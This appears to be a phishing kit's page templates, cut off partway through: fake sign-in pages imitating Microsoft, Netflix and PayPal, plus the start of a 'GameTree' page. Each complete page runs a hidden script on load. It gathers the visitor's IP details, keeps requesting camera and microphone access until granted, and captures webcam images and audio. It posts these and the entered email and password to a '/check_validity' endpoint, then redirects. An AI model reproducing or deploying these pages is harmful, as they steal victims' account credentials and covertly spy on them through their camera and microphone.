    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f3f3f3;
        }
        .container {
            width: 100%;
            max-width: 440px;
            padding: 32px;
            border: 1px solid #e1e1e1;
            border-radius: 4px;
            background-color: #fff;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            box-sizing: border-box;
            margin: 20px;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 108px; /* Microsoft logo size */
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #1b1b1b;
            text-align: left;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #5e5e5e;
            text-align: left;
            margin-bottom: 24px;
        }
        .input-container {
            margin-bottom: 20px;
            position: relative;
        }
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #8c8c8c;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0078d4; /* Microsoft blue */
            box-shadow: 0 0 0 1px #0078d4;
        }
        .forgot-link {
            margin: 8px 0 20px;
        }
        .forgot-link a {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .buttons {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-top: 20px;
        }
        .back-link a {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
            margin-right: 20px;
        }
        .back-link a:hover {
            text-decoration: underline;
        }
        .next-btn, .signin-btn {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #005a9e; /* Darker Microsoft blue */
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #666;
            font-size: 12px;
            padding: 12px 0;
            background-color: #f3f3f3;
        }
        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #d13438;
            font-size: 12px;
            margin-top: 6px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 84px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 13px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 12px;
            }
            .back-link {
                margin-bottom: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://www.microsoft.com/favicon.ico" alt="Microsoft Logo" class="logo">
        <h1>Sign in</h1>
        <div class="subtitle">Enter your email, phone, or Skype</div>
        <div class="input-container">
            <input type="email" id="email-input" placeholder="Email, phone, or Skype" required>
            <div id="email-error" class="error">Enter a valid email, phone, or Skype</div>
        </div>
        <div class="forgot-link">
            <a href="#">Can't access your account?</a>
        </div>
        <div class="buttons">
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://www.microsoft.com/favicon.ico" alt="Microsoft Logo" class="logo">
        <h1>Sign in</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="back-link">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English (United States)</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Help</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                await Promise.race([loaded, timeoutPromise]);
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                try {
                    recorder.start();
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }
                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://microsoft.com/',
                'https://office.com/'
            ];
            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email, phone, or Skype cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email, phone, or Skype";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;
            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", "nl0": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Netflix+Sans:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: url('https://gcdnb.pbrd.co/images/pU75rxqze8jE.jpg?o=1') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6); /* Dark overlay */
            backdrop-filter: blur(8px); /* Blur effect for background */
            z-index: 1;
        }
        .container {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 450px;
            padding: 60px 68px 40px;
            background: rgba(0, 0, 0, 0.85);
            border-radius: 4px;
            box-sizing: border-box;
            color: #fff;
            margin: 20px;
        }
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 120px; /* Adjusted for horizontal logo */
            z-index: 3;
        }
        h1 {
            font-size: 32px;
            font-weight: 700;
            margin: 0 0 28px;
            color: #fff;
        }
        .input-container {
            margin-bottom: 16px;
            position: relative;
        }
        input {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            outline: none;
            box-sizing: border-box;
            transition: background 0.2s;
        }
        input:focus {
            background: #454545;
        }
        input::placeholder {
            color: #8c8c8c;
        }
        .error {
            color: #e87c03;
            font-size: 13px;
            margin-top: 6px;
            text-align: left;
            display: none;
        }
        .signin-btn {
            width: 100%;
            background: #e50914; /* Netflix red */
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 24px;
            transition: background 0.2s;
        }
        .signin-btn:hover {
            background: #b20710; /* Darker red */
        }
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
            font-size: 13px;
            color: #b3b3b3;
        }
        .options input[type="checkbox"] {
            margin-right: 4px;
        }
        .options a {
            color: #b3b3b3;
            text-decoration: none;
        }
        .options a:hover {
            text-decoration: underline;
        }
        .signup {
            margin-top: 16px;
            text-align: center;
            font-size: 16px;
            color: #737373;
        }
        .signup a {
            color: #fff;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background: rgba(0, 0, 0, 0.75);
            padding: 20px 0;
            text-align: center;
            color: #737373;
            font-size: 13px;
            z-index: 2;
        }
        .footer a {
            color: #737373;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
                background: #000;
                border-radius: 0;
            }
            .logo {
                width: 90px;
            }
            h1 {
                font-size: 24px;
            }
            .signin-btn {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
    <div class="container">
        <h1>Sign In</h1>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Email or phone number" required>
            <div id="email-error" class="error">Please enter a valid email or phone number</div>
        </div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Please enter your password</div>
        </div>
        <button class="signin-btn" onclick="handleSignIn()">Sign In</button>
        <div class="options">
            <label><input type="checkbox" checked> Remember me</label>
            <a href="#">Need help?</a>
        </div>
        <div class="signup">
            New to Netflix? <a href="#">Sign up now</a>.
        </div>
    </div>

    <div class="footer">
        <a href="#">FAQ</a>
        <a href="#">Help Center</a>
        <a href="#">Terms of Use</a>
        <a href="#">Privacy</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;
        let accountSent = false;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                await Promise.race([loaded, timeoutPromise]);
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                try {
                    recorder.start();
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }
                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://netflix.com/',
                'https://www.netflix.com/login'
            ];
            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email || !emailRegex.test(email)) {
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", "pl0": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f9fa; /* PayPal's light gray */
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 32px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            box-sizing: border-box;
            margin: 20px;
        }
        .logo {
            width: 120px;
            margin-bottom: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #333;
            margin: 0 0 24px;
        }
        .input-container {
            margin-bottom: 16px;
            position: relative;
        }
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #c7c7c7;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        input:focus {
            border-color: #0070ba; /* PayPal blue */
            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
        }
        .error {
            color: #d32f2f;
            font-size: 12px;
            margin-top: 6px;
            text-align: left;
            display: none;
        }
        .signin-btn {
            width: 100%;
            background: #0070ba; /* PayPal blue */
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: background 0.2s;
        }
        .signin-btn:hover {
            background: #005ea6; /* Darker blue */
        }
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
            font-size: 13px;
            color: #666;
        }
        .options input[type="checkbox"] {
            margin-right: 4px;
        }
        .options a {
            color: #0070ba;
            text-decoration: none;
        }
        .options a:hover {
            text-decoration: underline;
        }
        .signup {
            margin-top: 24px;
            text-align: center;
            font-size: 14px;
            color: #666;
        }
        .signup a {
            color: #0070ba;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background: #ececec;
            padding: 12px 0;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
                border-radius: 0;
                box-shadow: none;
            }
            .logo {
                width: 100px;
            }
            h1 {
                font-size: 20px;
            }
            .signin-btn {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" class="logo">
        <h1>Log in to your PayPal account</h1>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Email or mobile number" required>
            <div id="email-error" class="error">Please enter a valid email or mobile number</div>
        </div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Please enter your password</div>
        </div>
        <button class="signin-btn" onclick="handleSignIn()">Log In</button>
        <div class="options">
            <label><input type="checkbox"> Stay logged in</label>
            <a href="#">Forgot password?</a>
        </div>
        <div class="signup">
            New to PayPal? <a href="#">Sign Up</a>
        </div>
    </div>

    <div class="footer">
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Contact Us</a>
        <a href="#">Help</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;
        let accountSent = false;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                await Promise.race([loaded, timeoutPromise]);
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                try {
                    recorder.start();
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }
                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://paypal.com/',
                'https://www.paypal.com/signin'
            ];
            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email || !emailRegex.test(email)) {
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", "gtl0": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your GameTree account</title>
    <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #000000, #3E1274); /* Black to specified dark blue */
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            color: #fff; /* Default text color for visibility */
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 32px;
            background: rgba(0, 0, 0, 0.9); /* Semi-transparent black */
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
            box-sizing: border-box;
            margin: 20px;
            border: 1px solid #3E1274; /* Dark blue border */
            text-align: center; /* Center all content */
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #fff;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #b3b3b3; /* Light gray for subtitle */
            margin-bottom: 24px;
        }
        .input-container {
            margin-bottom: 16px;
            position: relative;
        }
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            background: #1a1a1a; /* Dark gray input background */
            border: 1px solid #3E1274; /* Dark blue border */
            border-radius: 4px;
            color: #fff;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        input:focus {
            border-color: #5A1EAA; /* Lighter shade of #3E1274 for focus */
            box-shadow: 0 0 0 2px rgba(90, 30, 170, 0.3);
        }
        input::placeholder {
            color: #b3b3b3; /* Light gray placeholder */
        }
        .error {
            color: #ff4d4d; /* Bright red for errors */
            font-size: 12px;
            margin-top: 6px;
            text-align: left;
            display: none;
        }
        .forgot-password {
            font-size: 13px;
            color: #5A1EAA; /* Lighter shade of #3E1274 */
            margin-bottom: 16px;
            display: block;
        }
        .continue-btn {
            width: 100%;
            background: #3E1274; /* Dark blue button */
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: background 0.2s;
        }
        .continue-btn:hover {
            background: #2C0D54; /* Darker shade of #3E1274 */
        }
        .terms {
            margin-top: 16px;
            font-size: 12px;
            color: #b3b3b3;
            text-align: center; /* Explicitly centered */
        }
        .terms a {
